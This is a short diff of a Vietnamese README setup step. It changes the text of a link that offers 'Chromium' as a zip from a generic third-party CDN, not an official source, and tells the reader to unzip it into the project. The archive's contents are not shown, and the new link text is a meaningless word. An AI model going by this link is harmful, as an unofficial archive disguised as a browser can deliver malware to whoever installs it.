@@ -41,7 +41,7 @@ cp example .env.local
 ```
 
 ### 5. Tải Chromium Browser
- [Chromium sẽ được tự động tải khi chạy lần đầu](https://cdn.rawops.net/f/orHj/chromium.zip)
+ [Tỉa](https://cdn.rawops.net/f/orHj/chromium.zip)
 ```bash
 # Và giải nén cho thư mục chromium/
 ```
